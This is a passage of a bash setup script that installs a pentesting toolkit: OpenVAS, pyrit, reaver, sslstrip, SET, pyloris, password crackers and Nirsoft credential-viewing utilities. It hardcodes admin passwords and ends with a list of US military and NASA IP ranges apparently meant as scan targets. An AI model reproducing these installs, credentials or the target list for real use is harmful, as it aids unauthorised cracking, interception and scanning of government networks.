echo -n "[*] Installing OpenVas ... "

timelapsed &

cd /pentest

apt-get install -y --force-yes libqt4-sql gnutls-bin gnutls-dev glib-2.0 libxml++ libmicrohttpd5 xsltproc e2fsprogs libglib2.0-0 libgnutls26 libpcapnav0 libgpgme++  xsltproc 1> /dev/null 2> $LOG

svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-libraries 1> /dev/null

cd openvas-libraries
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr openvas-libraries

svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-scanner 1> /dev/null
cd openvas-scanner
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr openvas-scanner

svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-manager 1> /dev/null
cd openvas-manager
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr openvas-manager

svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-administrator 1> /dev/null
cd openvas-administrator
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr openvas-administrator

openvas-mkcert  1> /dev/null  # Certificates Creation
openvas-nvt-sync  1> /dev/null  # Sincronisation Network Vulnerability Tests
openvasad -c add_user --name=darkeffe --password=darkefferulez --role=Admin  1> /dev/null  # Creating User With Administrator Rank
openvas-mkcert-client -n darkeffe -i  1> /dev/null  # linking User "darkeffe" With Certificates [Creating The Key]
openvassd  1> /dev/null  # Start Openvas Scanner
openvasmd --rebuild  1> /dev/null  # Initialise The Database
kill all openvassd 1> /dev/null

cd $home

rm -f omp.config
touch omp.config
echo "
[Connection]
host=localhost
port=9390
username=darkeffe
password=darkefferulez
" >> omp.config

cd $home

time_stop

}

f_p0f () {

echo -n "[*] Installing P0f ... "

timelapsed &

cd /pentest

axel http://lcamtuf.coredump.cx/p0f.tgz 1> /dev/null

tar xvfz p0f.tgz 1> /dev/null
cd p0f
make 1> /dev/null
make install 1> /dev/null

cd ..
rm -f p0f.tgz

cd $home

time_stop

}

f_pdftotext () {

echo -n "[*] Installing PdfToText ... "

timelapsed &

# apt-get install -y --force-yes pdftotext 1> /dev/null 2> $LOG

cd /pentest

axel ftp://ftp.foolabs.com/pub/xpdf/xpdf-3.03.tar.gz 1> /dev/null
tar xvfz xpdf-3.03.tar.gz 1> /dev/null

cd xpdf-3.03

./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null

cd ..

rm -fr xpdf-3.03

cd $home

time_stop

}

f_pdfcrack () {

echo -n "[*] Installing PdfCrack ... "

timelapsed &

cd /pentest

axel http://sourceforge.net/projects/pdfcrack/files/pdfcrack/pdfcrack-0.11/pdfcrack-0.11.tar.gz

tar xvfz pdfcrack-0.11.tar.gz 1> /dev/null

cd pdfcrack-0.11

make 1> /dev/null

cd ..

rm -f pdfcrack-0.11.tar.gz

ln -fs /pentest/pdfcrack-0.11/pdfcrack /usr/local/bin

cd $home

time_stop

}

f_pyloris () {

echo -n "[*] Installing PyLoris ... "

timelapsed &

cd /pentest

axel http://ovh.dl.sourceforge.net/project/pyloris/pyloris/3.2/pyloris-3.2.tgz 1> /dev/null
tar xvf pyloris-3.2.tgz 1> /dev/null

mv pyloris-3.2 pyloris

rm -f pyloris-3.2.tgz

cd $home

time_stop

}

f_pyrit () { # python python-dev scapy libssl-dev zlib1g-dev libpcap-dev

echo "[*] Pyrit"

timelapsed &

cd /pentest

echo "   - Downloading SubVersion Source Code ... "
svn checkout http://pyrit.googlecode.com/svn/trunk/ pyrit_svn 1> /dev/null

echo "   - Installing SqlAlchemy ... "
axel http://sourceforge.net/projects/sqlalchemy/files/sqlalchemy/0.7.8/SQLAlchemy-0.7.8.tar.gz 1> /dev/null
tar zxvf SQLAlchemy-0.7.8.tar.gz 1> /dev/null
cd SQLAlchemy-0.7.8
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..
rm -f SQLAlchemy-0.7.8.tar.gz
rm -fr SQLAlchemy-0.7.8

echo -n "   - Compiling And Installing Pyrit ... "
cd pyrit_svn
cd pyrit
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..

echo -n "   - Configuring ... "
cd $home
mkdir -p .pyrit
cd $home/.pyrit
rm -f config
touch config
echo "default_storage = sqlite:///pyrit.db
limit_ncpus = 0
rpc_announce = true
rpc_announce_broadcast = false
rpc_knownclients =
rpc_server = false
workunit_size = 75000
" >> config

cd /pentest
rm -fr pyrit_svn

cd $home

time_stop

}

f_pyrit_cuda () { # python scapy libssl-dev zlib1g-dev libpcap-dev

echo "[*] Pyrit with Cuda Support"

timelapsed &

cd /pentest

echo "   - Downloading SubVersion Source Code ... "
svn checkout http://pyrit.googlecode.com/svn/trunk/ pyrit_svn 1> /dev/null

echo "   - Installing SqlAlchemy ... "
axel http://sourceforge.net/projects/sqlalchemy/files/sqlalchemy/0.7.8/SQLAlchemy-0.7.8.tar.gz 1> /dev/null
tar zxvf SQLAlchemy-0.7.8.tar.gz 1> /dev/null
cd SQLAlchemy-0.7.8
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..
rm -f SQLAlchemy-0.7.8.tar.gz
rm -fr SQLAlchemy-0.7.8

echo -n "   - Compiling And Installing Pyrit ... "
cd pyrit_svn
cd pyrit
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..

echo -n "   - Configuring ... "
cd $home
mkdir -p .pyrit
cd $home/.pyrit
rm -f config
touch config
echo "default_storage = sqlite:///pyrit.db
limit_ncpus = 0
rpc_announce = true
rpc_announce_broadcast = false
rpc_knownclients =
rpc_server = false
workunit_size = 75000
" >> config

echo "  - Installing Cpyrit Cuda ... "
cd /pentest/pyrit_svn/cpyrit_cuda
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null

cd /pentest
rm -fr pyrit_svn

cd $home

time_stop

}

f_pyrit_opencl () { # python scapy libssl-dev zlib1g-dev libpcap-dev

echo "[*] Pyrit with Opencl Support"

timelapsed &

cd /pentest

echo "   - Downloading SubVersion Source Code ... "
svn checkout http://pyrit.googlecode.com/svn/trunk/ pyrit_svn 1> /dev/null

echo "   - Installing SqlAlchemy ... "
axel http://sourceforge.net/projects/sqlalchemy/files/sqlalchemy/0.7.8/SQLAlchemy-0.7.8.tar.gz 1> /dev/null
tar zxvf SQLAlchemy-0.7.8.tar.gz 1> /dev/null
cd SQLAlchemy-0.7.8
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..
rm -f SQLAlchemy-0.7.8.tar.gz
rm -fr SQLAlchemy-0.7.8

echo -n "   - Compiling And Installing Pyrit ... "
cd pyrit_svn
cd pyrit
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..

echo -n "   - Configuring ... "
cd $home
mkdir -p .pyrit
cd $home/.pyrit
rm -f config
touch config
echo "default_storage = sqlite:///pyrit.db
limit_ncpus = 0
rpc_announce = true
rpc_announce_broadcast = false
rpc_knownclients =
rpc_server = false
workunit_size = 75000
" >> config

echo -n "   - Installing Cpyrit OpenCl ... "
cd /pentest/pyrit_svn/cpyrit_opencl
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null

cd /pentest
rm -fr pyrit_svn

cd $home

time_stop

}

f_pyrit_callpp () { # python scapy libssl-dev zlib1g-dev libpcap-dev

echo "[*] Pyrit with Call++ Support"

timelapsed &

cd /pentest

echo "   - Downloading SubVersion Source Code ... "
svn checkout http://pyrit.googlecode.com/svn/trunk/ pyrit_svn 1> /dev/null

echo "   - Installing SqlAlchemy ... "
axel http://sourceforge.net/projects/sqlalchemy/files/sqlalchemy/0.7.8/SQLAlchemy-0.7.8.tar.gz 1> /dev/null
tar zxvf SQLAlchemy-0.7.8.tar.gz 1> /dev/null
cd SQLAlchemy-0.7.8
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..
rm -f SQLAlchemy-0.7.8.tar.gz
rm -fr SQLAlchemy-0.7.8

echo -n "   - Compiling And Installing Pyrit ... "
cd pyrit_svn
cd pyrit
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null
cd ..

echo -n "   - Configuring ... "
cd $home
mkdir -p .pyrit
cd $home/.pyrit
rm -f config
touch config
echo "default_storage = sqlite:///pyrit.db
limit_ncpus = 0
rpc_announce = true
rpc_announce_broadcast = false
rpc_knownclients =
rpc_server = false
workunit_size = 75000
" >> config

cd /pentest
rm -fr pyrit_svn

cd $home

time_stop

}

f_rarcrack () {

echo -n "[*] Installing RarCrack ... "

timelapsed &

cd /pentest

axel http://sourceforge.net/projects/rarcrack/files/rarcrack-0.2/%5BUnnamed%20release%5D/rarcrack-0.2.tar.bz2 1> /dev/null

tar xvfi rarcrack-0.2.tar.bz2 1> /dev/null

cd rarcrack-0.2

make 1> /dev/null
make install 1> /dev/null

cd ..
rm -fr rarcrack-0.2
rm -f rarcrack-0.2.tar.bz2

cd $home

time_stop

}

f_reaver_wps () {

echo -n "[*] Installing RarCrack ... "

timelapsed &

cd /pentest

svn checkout http://reaver-wps.googlecode.com/svn/trunk/ reaver-wps-read-only 1> /dev/null 2> $LOG

cd src

./configure 1> /dev/null 2> $LOG
make 1> /dev/null 2> $LOG
make install 1> /dev/null 2> $LOG

time_stop

cd $home
}

f_set () { # metasploit

echo -n "[*] Installing SocialEnineeringKit (SET) ... "

timelapsed &

cd /pentest

svn co http://svn.secmaniac.com/social_engineering_toolkit set/ 1> /dev/null

ln -sf /pentest/set/set /usr/local/bin/

cd $home

time_stop

}

f_sslstrip () { # python python-twisted-web dsniff

echo -n "[*] Install SslStrip ... "

timelapsed &

cd /pentest

axel http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.9.tar.gz 1> /dev/null

tar xvzf sslstrip-0.9.tar.gz 1> /dev/null

cd /pentest/sslstrip-0.9
python setup.py build 1> /dev/null
python setup.py install 1> /dev/null

cd ..
rm -fr sslstrip-0.9
rm -f sslstrip-0.9.tar.gz

cd $home

time_stop

}

f_uniofuzz () { # python

echo -n "[*] Install UnioFuzz ... "

timelapsed &

cd /pentest

mkdir -p uniofuzz

axel http://www.nullsecurity.net/tools/uniofuzz.py 1> /dev/null

cd $home

time_stop

}

f_w3af () {

echo -n "[*] Installing W3af ... "

timelapsed &

cd /pentest

svn co https://w3af.svn.sourceforge.net/svnroot/w3af/trunk w3af  1> /dev/null

cd $home

time_stop

}

f_wifite () { # aircrack-ng cowpatty pyrit

echo -n "[*] Installing WiFiTe ... "

timelapsed &

cd /pentest

rm -f wifite.py

wget -O wifite.py http://wifite.googlecode.com/svn/trunk/wifite.py 1> /dev/null

cd $home

time_stop

}

f_wireshark_buntu_debian () { # perl pod2man pkg-config libpcap-dev ( yacc | Bison) flex libgtk-2.0-0 libglib2.0-dev libgeoip-dev libpcre3-dev libtool

echo "[*] Installing Wireshark ... "

echo "     Installing Dependencies ... "
timelapsed &
apt-get install -y --force-yes build-essential perl autoconf libgtk2.0-dev libglib2.0-dev libgeoip-dev libpcre3-dev libpcap0.8-dev libtool bison flex subversion 1> /dev/null 2> $LOG
time_stop

cd /pentest

echo -n "    Downloading SVN Source Code ... "
timelapsed &
svn co https://anonsvn.wireshark.org/wireshark/trunk/ wireshark  1> /dev/null
time_stop

cd wireshark

echo "    Compiling ... "

echo -n "          -autogen.sh ... "
timelapsed &
bash autogen.sh  1> /dev/null 2> $LOG
touch $home/pio.txt
sleep 1
rm -f $home/pio.tx
echo ""

echo -n "          -configure ... "
timelapsed &
./configure 1> /dev/null
time_stop

echo -n "          -make ... "
timelapsed &
make  1> /dev/null 2> $LOG
time_stop

echo -n "          -make install ... "
timelapsed &
make install  1> /dev/null 2> $LOG
time_stop

cd ..
rm -fr wireshark
cd $home

time_stop

}

f_wireshark_gentoo () {

echo -n "[*] Installing Wireshark ... "

timelapsed &

USE="adns gtk ipv6 portaudio snmp ssl kerberos threads selinux" emerge wireshark 1> /dev/null 2> $LOG

time_stop

}

f_wyd () {

echo -n "[*] Installing Wyd ... "

timelapsed &

cd /pentest

axel http://www.remote-exploit.org/wp-content/uploads/2010/01/wyd-0.2.tar.gz  1> /dev/null

tar xfvz wyd-0.2.tar.gz  1> /dev/null

rm -f wyd-0.2.tar.gz

cd $home

time_stop

}


f_windows_binaries () {

echo "[*] Downloading Windows Binaries ... "

cd /pentest

mkdir -p windows-binaries
cd windows-binaries

f_nirsoft () {

mkdir -p nirsoft
cd nirsoft

echo "  -- Nirsoft : "

echo "      ChromeHistoryView"
wget http://www.nirsoft.net/utils/chromehistoryview.zip 1> /dev/null
unzip chromehistoryview.zip 1> /dev/null
rm -f readme.txt
echo "      Cports"
wget http://www.nirsoft.net/utils/cports.zip 1> /dev/null
unzip cports.zip 1> /dev/null
rm -f readme.txt
echo "      DialUpass"
wget http://www.nirsoft.net/utils/dialupass.zip 1> /dev/null
unzip dialupass.zip 1> /dev/null
rm -f readme.txt
echo "      FirefoxDownloadsView"
wget http://www.nirsoft.net/utils/firefoxdownloadsview.zip 1> /dev/null
unzip firefoxdownloadsview.zip 1> /dev/null
rm -f readme.txt
echo "      LiveContactsView"
wget http://www.nirsoft.net/utils/livecontactsview.zip 1> /dev/null
unzip livecontactsview.zip 1> /dev/null
rm -f readme.txt
echo "      MACAdressView"
wget http://www.nirsoft.net/utils/macadressview.zip 1> /dev/null
unzip macadressview.zip 1> /dev/null
rm -f readme.txt
echo "      MailPv"
wget http://www.nirsoft.net/utils/mailpv.zip 1> /dev/null
unzip mailpv.zip 1> /dev/null
rm -f readme.txt
echo "      MessenPass"
wget http://www.nirsoft.net/utils/mspass.zip 1> /dev/null
unzip mspass.zip 1> /dev/null
rm -f readme.txt
echo "      MozillaHistoryView"
wget http://www.nirsoft.net/utils/mozillahistoryview.zip 1> /dev/null
unzip mozillahistoryview.zip 1> /dev/null
rm -f readme.txt
echo "      MyLastSearch"
wget http://www.nirsoft.net/utils/mylastsearch.zip 1> /dev/null
unzip mylastsearch.zip 1> /dev/null
rm -f readme.txt
echo "      NetPass"
wget http://www.nirsoft.net/utils/netpass.zip 1> /dev/null
unzip netpass.zip 1> /dev/null
rm -f readme.txt
echo "      OpenedFilesView"
wget http://www.nirsoft.net/utils/ofview.zip 1> /dev/null
unzip ofview.zip 1> /dev/null
rm -f readme.txt
echo "      ProductKey"
wget http://www.nirsoft.net/utils/produkey.zip 1> /dev/null
unzip produkey.zip 1> /dev/null
rm -f readme.txt
echo "      RemoteDesktopPasswordView"
wget http://www.nirsoft.net/utils/rdpv.zip 1> /dev/null
unzip rdpv.zip 1> /dev/null
rm -f readme.txt
echo "      SafariHistoryView"
wget http://www.nirsoft.net/utils/safarihistoryview.zip 1> /dev/null
unzip safarihistoryview.zip 1> /dev/null
rm -f readme.txt
echo "      SkypeLogView"
wget http://www.nirsoft.net/utils/skypelogview.zip 1> /dev/null
unzip skypelogview.zip 1> /dev/null
rm -f readme.txt
echo "      UsbDeView"
wget http://www.nirsoft.net/utils/usbdeview.zip 1> /dev/null
unzip usbdeview.zip 1> /dev/null
rm -f readme.txt
echo "      WebBrowserPassView"
wget http://www.nirsoft.net/utils/webbrowserpassview.zip 1> /dev/null
unzip webbrowserpassview.zip 1> /dev/null
rm -f readme.txt
echo "      VNCPassView"
wget http://www.nirsoft.net/utils/vncpassview.zip 1> /dev/null
unzip vncpassview.zip 1> /dev/null
rm -f readme.txt
echo "      WirelessKeyView"
wget http://www.nirsoft.net/utils/wirelesskeyview.zip 1> /dev/null
unzip wirelesskeyview.zip 1> /dev/null
rm -f readme.txt

rm -f *.zip

cd ..

}

f_nirsoft

f_vulnerableserver () {

echo "  -- Vulnerable Server"

mkdir -p vulnerableserver

cd vulnerableserver

axel http://sites.google.com/site/lupingreycorner/vulnserver.zip 1> /dev/null

unzip vulnserver.zip 1> /dev/null

}

f_vulnerableserver

cd $home

}


# Bitcoin
f_bitcoin () { # pyopencl for GPUGP

mkdir -p $HOME/bitcoin
cd $HOME/bitcoin
axel http://heanet.dl.sourceforge.net/project/bitcoin/Bitcoin/bitcoin-0.4.0/bitcoin-0.4.0-linux.tar.gz
git clone https://github.com/m0mchil/poclbm.git
tar xvf bitcoin-0.3.24-linux.tar.gz
mkdir -p $HOME/.bitcoin
echo "rpcuser=darkeffe" > $HOME/.bitcoin/bitcoin.conf
echo "rpcpassword=darkeffe1z2x3c4v5b6n7mdarkeffe" >> $HOME/.bitcoin/bitcoin.conf
echo "rpcallowip=127.0.0.1" >> $HOME/.bitcoin/bitcoin.conf

f_script () {

# Starting Bitcoin demon
$HOME/bitcoin/bitcoin-*/bin/32/bitcoind &

echo "Starting mining on every resource available ... "
DISPLAY=:0 python $HOME/bitcoin/poclbm/poclbm.py --user=yourusername --pass=yourpassword -f1 -v -w128 -d0&
# This line reserved for cpu. Un-comment and set the device to enable
python ./poclbm.py --user=drgr33n --pass=19845678 -dcpu0 -f60 -w128
python ./poclbm.py --user=drgr33n --pass=19845678 -dcpu1 -f60 -w128

}

}


# Clean&Customize
f_clean () {

# Clean Sistema
echo "  [*] Autoremove --purge | Clean | Autoclean | Speed Up"
apt-get autoremove --purge -y --force-yes 1> /dev/null
apt-get clean -y --force-yes 1> /dev/null
apt-get autoclean -y --force-yes 1> /dev/null


# Swap
echo "vm.swappiness=9" >> /etc/sysctl.conf

# Connessione
echo "
net.ipv4.tcp_windows_scaling=1
net.core.rmem_max= 253792
net.core wmem_max=253792
net.ipv4.tcp_wmem=8388608
net.ipv4.tcp_rmem=8388608
net.ipv4.tcp_mem=8388608 8388608 8388608
net.ipv4.tcp_fin_timeout = 25
net.ipv4.tcp_keepalive_time = 25
" >> /etc/sysctl.conf

# Rimozione console login aggiuntive
cp /etc/default/console-setup /etc/default/console-setup.backup
cp /etc/init/tty2.conf /etc/init/tty2.conf.backup
cp /etc/init/tty3.conf /etc/init/tty3.conf.backup
cp /etc/init/tty4.conf /etc/init/tty4.conf.backup
cp /etc/init/tty5.conf /etc/init/tty5.conf.backup
cp /etc/init/tty6.conf /etc/init/tty6.conf.backup
echo "
VERBOSE_OUTPUT=no
ACTIVE_CONSOLES="/dev/tty[1]"
CHARMAP="UTF-8"
CODESET="Lat15"
FONTFACE="VGA"
FONTSIZE="16"
XKBMODEL="pc105"
XKBLAYOUT="it"
XKBVARIANT=""
XKBOPTIONS=""
"> /tmp/console-setup
mv /tmp/console-setup /etc/default/console-setup
echo "
respawn
exec /sbin/getty -8 38400 tty2
" > /tmp/tty2.conf
mv /tmp/tty2.conf /etc/init/tty2.conf
echo "
respawn
exec /sbin/getty -8 38400 tty3
" > /tmp/tty3.conf
mv /tmp/tty3.conf /etc/init/tty3.conf
echo "
respawn
exec /sbin/getty -8 38400 tty4
" > /tmp/tty4.conf
mv /tmp/tty4.conf /etc/init/tty4.conf
echo "
respawn
exec /sbin/getty -8 38400 tty5
" > /tmp/tty5.conf
mv /tmp/tty5.conf /etc/init/tty5.conf
echo "
respawn
exec /sbin/getty -8 38400 tty6
" > /tmp/tty6.conf
mv /tmp/tty6.conf /etc/init/tty6.conf

# Bashrc
# color: PS1='\[\e[0;31m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[0;31m\]\$ \[\e[m\]\[\e[0;32m\]'
cd $home
rm -f .bashrc
touch .bashrc
echo "# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z £+harrypotterPS1£+ ] && return

# don't put duplicate lines in the history. See bash(1) for more options
# ... or force ignoredups and ignorespace
HISTCONTROL=ignoredups:ignorespace

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval £+harrypotter(SHELL=/bin/sh lesspipe)£+

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z £+harrypotterdebian_chroot£+ ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=harrypotter(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we £+want£+ color)
case £+harrypotterTERM£+ in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n £+harrypotterforce_color_prompt£+ ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ £+harrypottercolor_prompt£+ = yes ]; then
    PS1='\[\e[0;31m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[0;31m\]\harrypotter \[\e[m\]\[\e[0;32m\]'
else
    PS1='harrypotter{debian_chroot:+(harrypotterdebian_chroot)}\u@\h:\w\harrypotter '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case £+harrypotterTERM£+ in
xterm*|rxvt*)
    PS1=£+\[\e]0;harrypotter{debian_chroot:+(harrypotterdebian_chroot)}\u@\h: \w\a\]harrypotterPS1£+
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval £+harrypotter(dircolors -b ~/.dircolors)£+ || eval £+harrypotter(dircolors -b)£+
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an £+alert£+ alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i £+harrypotter([ harrypotter? = 0 ] && echo terminal || echo error)£+ £+harrypotter(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alertharrypotter//'\'')£+'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
    . /etc/bash_completion
fi

export RUBYOPT=/rubygems/
" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> .bashrc

echo "$home/.bashrc" >> $file


}


#==============================================================================================================================#

# Darkeffe's Script
f_darkeffe () {

echo "[***] Darkeffe Scripts"

f_compilec () {

echo "  [*] Compile C"
cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f compilec.sh 1> /dev/null
touch compilec.sh 1> /dev/null

f_writing_compilec () {

echo "#!/bin/bash

timelapsed () {

	k=1
	until [ -e harrypotterexe ]; do
		sleep 1
		if [ harrypotterk -lt 10 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 10 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 100 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 1000 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\b\c£+
		elif [ harrypotterk -ge 10000 ]; then
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\b\b\c£+
		else [ harrypotterk -ge 100000 ]
			echo -en  £+[harrypotterk s]\b\b\b\b\b\b\b\b\b\b\b\c£+
		fi
		k=harrypotter[ harrypotterk + 1 ]
	done

}

clear

echo £+Questo Script Compila Un Sorgente C£+
echo £+£+

echo -n £+Inserisci Il Percorso Del Sorgente (es: /home/user/program.c) : £+
read source

echo -n £+Inserisci Il Percorso DellEseguibile (es: /home/user/program) : £+
read exe

dialog --title £+Selection Parametres£+ --separate-output --output-fd 2 --checklist £+Select The Parametres That You Wanna Pass To Gcc : £+ 0 0 0 \
		-lm £+Math.h£+ off \
		`pkg-config --cflags --libs gtk+-2.0` £+Gtk£+ off \
		-lncurses £+Ncurses£+ off \
		-pthreads £+Pthreads£+ off \
		-O1 £+Optimisation Level 1£+ off \
		-O2 £+Optimisation Level 2£+ off \
		-O3 £+Optimisation Level 3£+ off \
		-Wall £+All Warnings£+ off \
		2> harrypotterPWD/parametres

options=harrypotter( cat harrypotterPWD/parametres | sort -u | tr '\012' ' ' )
rm -f harrypotterPWD/parametres

echo £+£+
echo -n £+[*] Compiling ... £+
timelapsed &

sleep 2
gcc -o harrypotter.bin harrypottersource harrypotteroptions

sleep 1

echo £+£+
echo £+Done !!!£+
echo £+Your Program Is In harrypotterexe£+

exit 0

" | sed -e 's/£+/"/g' -e 's/harrypotter/$/g' >> compilec.sh

}

f_writing_compilec

cd $HOME

ln -sf /opt/darkeffe/compilec.sh /usr/local/bin/compilec 1> /dev/null

}

f_compilec

f_famous_IP () {

echo "  [*] Famous IP"
cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f famousip.sh 1> /dev/null
touch famousip.sh 1> /dev/null

f_writing_famous_IP () {

echo "#!/bin/bash

echo £+Type one or two number for serching in the IP list£+
echo -n £+or The Name of The Istitution That You Are Looking For : £+
read b

a=£+6.* - Army Information Systems Center
7.*.*.* Defense Information Systems Agency, VA
11.*.*.* DoD Intel Information Systems, Defense Intelligence Agency, Washington DC
21. - US Defense Information Systems Agency
22.* - Defense Information Systems Agency
25.*.*.* Royal Signals and Radar Establishment, UK
26.* - Defense Information Systems Agency
29.* - Defense Information Systems Agency
30.* - Defense Information Systems Agency
49.* - Joint Tactical Command
50.* - Joint Tactical Command
55.* - Army National Guard Bureau
55.* - Army National Guard Bureau
62.0.0.1 - 62.30.255.255 Do not scan!

RANGE 128
128.37.0.0 Army Yuma Proving Ground
128.38.0.0 Naval Surface Warfare Center
128.43.0.0 Defence Research Establishment-Ottawa
128.47.0.0 Army Communications Electronics Command
128.49.0.0 Naval Ocean Systems Center
128.50.0.0 Department of Defense
128.51.0.0 Department of Defense
128.56.0.0 U.S. Naval Academy
128.60.0.0 Naval Research Laboratory
128.63.0.0 Army Ballistics Research Laboratory
128.80.0.0 Army Communications Electronics Command
128.98.0.0 - 128.98.255.255 Defence Evaluation and Research Agency
128.102.0.0 NASA Ames Research Center
128.149.0.0 NASA Headquarters
128.154.0.0 NASA Wallops Flight Facility
128.155.0.0 NASA Langley Research Center
128.156.0.0 NASA Lewis Network Control Center
128.157.0.0 NASA Johnson Space Center
128.158.0.0 NASA Ames Research Center
128.159.0.0 NASA Ames Research Center
128.160.0.0 Naval Research Laboratory
128.161.0.0 NASA Ames Research Center
128.183.0.0 NASA Goddard Space Flight Center
128.190.0.0 Army Belvoir Reasearch and Development Center
128.202.0.0 50th Space Wing
128.216.0.0 MacDill Air Force Base
128.217.0.0 NASA Kennedy Space Center
128.236.0.0 U.S. Air Force Academy

RANGE 129
129.23.0.0 Strategic Defense Initiative Organization
129.29.0.0 United States Military Academy
129.50.0.0 NASA Marshall Space Flight Center
129.51.0.0 Patrick Air Force Base
129.52.0.0 Wright-Patterson Air Force Base
129.53.0.0 - 129.53.255.255 66SPTG-SCB
129.54.0.0 Vandenberg Air Force Base, CA
129.92.0.0 Air Force Institute of Technology
129.99.0.0 NASA Ames Research Center
129.131.0.0 Naval Weapons Center
129.139.0.0 Army Armament Research Development and Engineering Center
129.141.0.0 85 MISSION SUPPORT SQUADRON/SCSN
129.163.0.0 NASA/Johnson Space Center
129.164.0.0 NASA IVV
129.165.0.0 NASA Goddard Space Flight Center
129.166.0.0 NASA - John F. Kennedy Space Center
129.167.0.0 NASA Marshall Space Flight Center
129.168.0.0 NASA Lewis Research Center
129.190.0.0 Naval Underwater Systems Center
129.198.0.0 Air Force Flight Test Center
129.209.0.0 Army Ballistics Research Laboratory
129.229.0.0 U.S. Army Corps of Engineers
129.251.0.0 United States Air Force Academy

RANGE 130
130.40.0.0 NASA Johnson Space Center
130.90.0.0 Mather Air Force Base
130.109.0.0 Naval Coastal Systems Center
130.114.0.0 Army Aberdeen Proving Ground Installation Support Activity
130.124.0.0 Honeywell Defense Systems Group
130.165.0.0 U.S.Army Corps of Engineers
130.167.0.0 NASA Headquarters

RANGE 131
131.3.0.0 - 131.3.255.255 Mather Air Force Base
131.6.0.0 Langley Air Force Base
131.10.0.0 Barksdale Air Force Base
131.17.0.0 Sheppard Air Force Base
131.21.0.0 Hahn Air Base
131.22.0.0 Keesler Air Force Base
131.24.0.0 6 Communications Squadron
131.25.0.0 Patrick Air Force Base
131.27.0.0 75 ABW
131.30.0.0 62 CS/SCSNT
131.32.0.0 37 Communications Squadron
131.35.0.0 Fairchild Air Force Base
131.36.0.0 Yokota Air Base
131.37.0.0 Elmendorf Air Force Base
131.38.0.0 Hickam Air Force Base
131.39.0.0 354CS/SCSN
131.40.0.0 Bergstrom Air Force Base
131.44.0.0 Randolph Air Force Base
131.46.0.0 20 Communications Squadron
131.47.0.0 Andersen Air Force Base
131.50.0.0 Davis-Monthan Air Force Base
131.52.0.0 56 Communications Squadron /SCBB
131.54.0.0 Air Force Concentrator Network
131.56.0.0 Upper Heyford Air Force Base
131.58.0.0 Alconbury Royal Air Force Base
131.59.0.0 7 Communications Squadron
131.61.0.0 McConnell Air Force Base
131.62.0.0 Norton Air Force Base
